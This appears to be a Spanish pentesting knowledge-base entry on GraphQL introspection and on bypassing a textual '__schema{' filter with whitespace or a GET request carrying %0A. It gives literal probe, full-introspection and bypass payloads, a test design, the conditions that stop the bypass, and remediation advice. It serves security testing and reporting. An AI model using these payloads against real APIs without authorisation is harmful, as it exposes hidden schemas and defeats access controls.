---
clase: inyeccion
tech: graphql
cwe: CWE-200
cvss: 5.3 # [derivado] revelacion completa del esquema de la API
payload: |
  # SONDA DE INTROSPECCION - LITERAL de la fuente:
  { "query": "{__schema{queryType{name}}}" }
  #
  # CONSULTA DE INTROSPECCION COMPLETA - LITERAL de la fuente.
  # ADVERTENCIA (H1): el render colapso los saltos de linea. Las lineas que empiezan
  # por '#' son COMENTARIOS de GraphQL, asi que en una sola linea comentan el resto y
  # la consulta NO se ejecuta. Hay que restaurar los saltos de linea, o borrar los
  # comentarios y sus directivas, como la propia fuente aconseja.
  #Full introspection query query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } onOperation #Often needs to be deleted to run query onFragment #Often needs to be deleted to run query onField #Often needs to be deleted to run query } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
  #
  # Si la consulta completa falla, la fuente indica ELIMINAR estas tres directivas:
  #   onOperation   onFragment   onField
  #
  # BYPASS POR ESPACIO EN BLANCO tras '__schema' - LITERAL de la fuente.
  # El comentario de la pagina dice 'with newline' pero el literal muestra un ESPACIO:
  # el render pudo colapsar el salto. No puedo confirmar cual era el caracter original.
  { "query": "query{__schema {queryType{name}}}" }
  #
  # LA MISMA IDEA VIA GET con el salto de linea URL-codificado como %0A - LITERAL:
  GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
precondicion: "Endpoint GraphQL alcanzable (ver graphql-descubrimiento-endpoint-universal-query). Para la introspeccion completa, que este habilitada. Para el bypass, que la defensa se implemente como un filtro TEXTUAL sobre la cadena '__schema{' en lugar de deshabilitar la introspeccion en el motor."
como_se_descubre: |
  Secuencia de coste creciente:
  1. Sonda corta de introspeccion (1 peticion). Si responde, el esquema completo esta a
     una peticion de distancia.
  2. Si la sonda se rechaza, probar la variante con espacio/salto tras '__schema'. Un
     rechazo de la forma pegada y una aceptacion de la espaciada demuestra que la
     defensa es un FILTRO DE CADENA, no una desactivacion real. Eso es un hallazgo en
     si mismo, independiente del esquema que se obtenga.
  3. Si ambas fallan, la via es GET con %0A: algunos filtros solo inspeccionan cuerpos
     POST y no la cadena de consulta.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: { "query": "{__schema{queryType{name}}}" }        -> rechazado
  # B: { "query": "query{__schema {queryType{name}}}" }  -> aceptado
  # El par A/B es el nucleo del hallazgo: prueba que la introspeccion SIGUE ACTIVA en
  # el motor y que lo unico que hay delante es una comparacion de texto. Reportar solo
  # B (sin A) deja al triador sin ver que existia una defensa y que se esquivo.
  # C: GET con %0A -> si funciona donde POST falla, el filtro solo mira el cuerpo.
mata: |
  - La introspeccion esta DESHABILITADA en el motor (no filtrada) -> ninguna variante
    funciona. Es la correccion correcta.
  - El filtro normaliza los espacios antes de comparar.
  - Apollo Server v4+ con 'hideSchemaDetailsFromClientErrors' (cierra tambien la via de
    sugerencias; ver writeup de suggestions).
  - A y B se comportan igual -> no hay filtro textual que destapar.
fuente: "https://portswigger.net/web-security/graphql. Sonda, consulta completa, nota sobre onOperation/onFragment/onField, bypass por espacio y forma GET con %0A, literales de la pagina. Burp Scanner emite 'GraphQL introspection enabled' segun la propia pagina."
confianza: media
fecha: 2026-11-02
---
# [INYECCIÓN] Introspección de GraphQL y bypass del filtro por espacio en blanco

## Principio
La introspección devuelve el esquema completo de la API: todos los tipos, campos,
argumentos y mutaciones, incluidos los que ningún cliente usa. Cuando un equipo decide
"cerrarla", la implementación frecuente es un filtro que busca la cadena `__schema{` en
la consulta. Y GraphQL, como casi todo lenguaje, **tolera espacios en blanco** donde el
filtro no los espera.

El resultado es la forma clásica de esta familia: una defensa que compara texto frente a
un motor que parsea gramática.

## Payload
Sonda corta:

```json
{ "query": "{__schema{queryType{name}}}" }
```

Si se rechaza, la misma consulta con un espacio tras `__schema`:

```json
{ "query": "query{__schema {queryType{name}}}" }
```

Y la variante por `GET`, con el salto de línea codificado:

```
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

## Advertencia de fidelidad
El comentario de la página dice *"with newline"* pero el literal que muestra contiene un
**espacio**. El render pudo colapsar un salto de línea, así que no puedo confirmar cuál
era el carácter original. Probar ambos. Es la razón de `confianza: media`.

Lo mismo afecta a la consulta de introspección completa: las líneas que empiezan por `#`
son comentarios de GraphQL, y colapsadas en una sola línea **comentan el resto de la
consulta**, que entonces no se ejecuta. Hay que restaurar los saltos o borrar los
comentarios — la propia fuente aconseja eliminar `onOperation`, `onFragment` y `onField`
si la consulta falla.

## El hallazgo está en el par, no en el esquema
Que `A` se rechace y `B` se acepte demuestra algo más valioso que el esquema obtenido:
que **la introspección sigue activa en el motor** y lo único que hay delante es una
comparación de cadenas. Reportar solo el payload que funciona deja al triador sin ver
que existía una defensa y que se esquivó, lo que suele degradar el informe a "la
introspección está abierta" — un diagnóstico que lleva a reforzar el filtro en lugar de
desactivar la introspección.

La vía `GET` añade un tercer dato: si funciona donde `POST` falla, el filtro solo
inspecciona cuerpos y no la cadena de consulta.

## Impacto
Mapa completo de la API, incluidos campos y mutaciones no documentados. Es el insumo de
todo lo demás: sin esquema se adivina, con esquema se lee.

## Remediación
De la fuente: *deshabilitar la introspección* si la API no es pública, y si lo es,
revisar el esquema buscando campos no intencionados. También: no exponer campos privados
de usuario como direcciones de correo o IDs.

`# [derivado]`: la corrección debe hacerse **en el motor**, no con un filtro sobre la
cadena de la consulta. Cualquier filtro textual sobre un lenguaje con gramática
tolerante a espacios tendrá un bypass; es el mismo principio 19 del documento de
mindset.
